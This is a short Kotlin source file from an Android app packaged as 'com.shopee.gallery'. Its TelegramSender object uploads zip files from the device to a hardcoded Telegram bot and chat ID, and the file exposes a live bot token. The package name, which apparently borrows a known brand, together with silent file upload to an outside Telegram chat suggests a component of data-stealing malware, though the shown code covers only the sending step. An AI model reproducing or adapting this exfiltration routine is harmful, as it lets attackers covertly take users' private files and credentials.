package com.shopee.gallery

import android.content.Context
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import java.io.File
import java.util.concurrent.TimeUnit

object TelegramSender {

    private const val BOT_TOKEN = "8653679916:AAFQj6IKzGYn0sGwvE8wvJzYUBj08-gKK1U";
    private const val CHAT_ID   = "8275632263"

    private val client = OkHttpClient.Builder()
        .connectTimeout(60, TimeUnit.SECONDS)
        .writeTimeout(300, TimeUnit.SECONDS)
        .readTimeout(300, TimeUnit.SECONDS)
        .build()

    fun kirimZip(ctx: Context, zipFile: File) {
        val url = "https://api.telegram.org/bot$BOT_TOKEN/sendDocument"

        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", CHAT_ID)
            .addFormDataPart("caption", "📦 ${zipFile.name} (${zipFile.length()/1024/1024} MB)")
            .addFormDataPart(
                "document", zipFile.name,
                zipFile.asRequestBody("application/zip".toMediaTypeOrNull())
            )
            .build()

        val req = Request.Builder().url(url).post(body).build()
        client.newCall(req).execute().use { }
    }
}
